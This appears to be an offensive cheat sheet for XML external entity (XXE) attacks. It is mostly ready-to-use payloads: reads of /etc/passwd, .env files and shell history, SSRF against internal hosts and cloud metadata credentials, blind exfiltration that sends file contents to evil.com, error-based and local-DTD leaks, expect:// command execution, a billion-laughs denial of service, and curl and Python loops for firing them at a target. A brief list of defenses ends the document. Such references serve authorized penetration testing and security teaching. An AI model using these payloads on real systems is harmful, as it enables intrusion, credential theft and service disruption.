# XXE — Cheat Sheet

Comprehensive payload reference. Detection workflow + quick reference in `xxe-quickstart.md`.

## Attack-type matrix

| Attack | Use when | Time |
|---|---|---|
| Basic file retrieval | Output reflected | Seconds |
| SSRF | Output reflected, target internal services | Seconds |
| Blind | No output, network egress allowed | Minutes |
| Error-based | Output not reflected but errors verbose | Seconds |
| XInclude | DOCTYPE blocked but XInclude allowed | Seconds |
| SVG | Image upload feature | Seconds |
| Local DTD | XXE allowed, no network egress | Minutes |
| Billion laughs | DoS test (caution!) | Seconds-minutes |

## File retrieval

```xml
<!-- Linux -->
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>

<!-- Windows -->
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]>

<!-- Read source -->
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///var/www/html/index.php">]>

<!-- Base64-wrap when special chars break parsing -->
<!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=file:///etc/passwd">]>
```

Common Linux targets: `/etc/passwd`, `/etc/hostname`, `/etc/issue`, `/proc/self/environ`, `/proc/version`, `/proc/cmdline`, `/var/log/apache2/access.log`, `/var/www/html/.env`, `/root/.bash_history`.

Common Windows targets: `C:/Windows/win.ini`, `C:/Windows/system.ini`, `C:/Windows/System32/drivers/etc/hosts`, `C:/inetpub/wwwroot/web.config`.

## SSRF

```xml
<!-- Internal HTTP -->
<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://internal-host:8080/admin">]>
<root>&xxe;</root>

<!-- Cloud metadata -->
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">

<!-- Internal port scan via timing diff -->
<!ENTITY xxe SYSTEM "http://internal:22/">    <!-- open ssh causes different timing -->
```

## Blind XXE / Error-based exfiltration

```xml
<!-- Blind: attacker hosts evil.dtd -->
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://evil.com/?d=%data;'>">
%param1;

<!-- Trigger -->
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY % remote SYSTEM "http://evil.com/evil.dtd">%remote;%exfil;]>
<root>1</root>

<!-- Error-based (when errors are verbose) -->
<!DOCTYPE root [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;%error;
]>
<root>1</root>
<!-- error path leaks contents -->
```

## XInclude

When DOCTYPE blocked but XInclude allowed:

```xml
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</root>
```

## SVG-based XXE

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
  <!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
</svg>
```

Upload as `.svg` to image upload feature; rendered as image, file content appears as text.

## Local DTD repurposing / PHP wrappers / Billion laughs / XSLT / XOP

```xml
<!-- Local DTD (no network egress) -->
<!DOCTYPE message [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso 'AAA)>
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;&#x25;error;<!ELEMENT aa (bb'>
  %local_dtd;
]>
<message>1</message>
```

Common DTDs: `/usr/share/yelp/dtd/docbookx.dtd` (param `ISOamso`), `/usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd`, `C:\Windows\System32\wbem\xml\cim20.dtd`. Use `xxe-dtd-finder` (https://github.com/GoSecure/dtd-finder).

```xml
<!-- PHP wrappers -->
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=file:///etc/passwd">
<!ENTITY xxe SYSTEM "expect://id">                <!-- if expect extension loaded -->

<!-- Billion laughs (DoS — only in lab) -->
<!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">...]>
<lolz>&lol9;</lolz>

<!-- XSLT file write via exsl:document -->
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:exsl="http://exslt.org/common" version="1.0">
  <xsl:template match="/"><exsl:document href="file:///tmp/written.txt" method="text">Content</exsl:document></xsl:template>
</xsl:stylesheet>
```

XOP/MTOM SSRF (SOAP):
```http
POST /soap HTTP/1.1
Content-Type: multipart/related; type="application/xop+xml"; boundary=BOUNDARY

--BOUNDARY
<soap:Envelope ...><soap:Body>
  <data><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="http://internal-host/admin"/></data>
</soap:Body></soap:Envelope>
--BOUNDARY
```

## Protocols

| Protocol | Use |
|---|---|
| `file://` | Read local files |
| `http://` / `https://` | SSRF |
| `ftp://` | Slow timing oracle for file existence |
| `gopher://` | Protocol smuggling (often blocked) |
| `dict://` | Memcached / Redis probing |
| `expect://` (PHP) | RCE if `expect` extension loaded |
| `php://filter` | Encoded file read |

## Testing — curl / Python

```bash
curl -X POST -H "Content-Type: application/xml" -d @payload.xml http://target/api/xml
curl -X POST -H "Content-Type: text/xml" --data-raw '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>' http://target/api/xml
# Multipart upload — when raw body returns help text ("Invalid XML Example: ..."), fuzz the field name:
for f in xml file data upload payload; do curl -s -X POST -F "$f=@payload.xml" http://target/api/xml | head -c 100; echo " -- $f"; done
```

When an `/articles/xml`-style endpoint silently returns help text on raw `application/xml` POST but accepts multipart on a specific field, the parser only fires for that field. Confirm via side-effects (record created in a list endpoint) — a 200 OK with help text doesn't mean the body was rejected.


```python
import requests
payload = '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
r = requests.post('http://target/api/xml', data=payload, headers={'Content-Type':'application/xml'})
```

## Defenses & XML surfaces

**Defenses:** Java `factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`; PHP `libxml_disable_entity_loader(true)`; Python `defusedxml`; .NET `DtdProcessing.Prohibit`; Node `xml2js` with strict mode + disabled DTD.

**File ext/Content-Type accepting XML:** `.xml .xhtml .svg .docx .xlsx .pptx .odt .epub`, `application/xml`, `text/xml`, `application/soap+xml`, `application/atom+xml`, `image/svg+xml`.

## References

- `xxe-quickstart.md` — fast smoke test.
- OWASP XXE Prevention Cheat Sheet.
- CWE-611 (XXE).
- PayloadsAllTheThings/XXE.
- PortSwigger XXE labs: https://portswigger.net/web-security/xxe
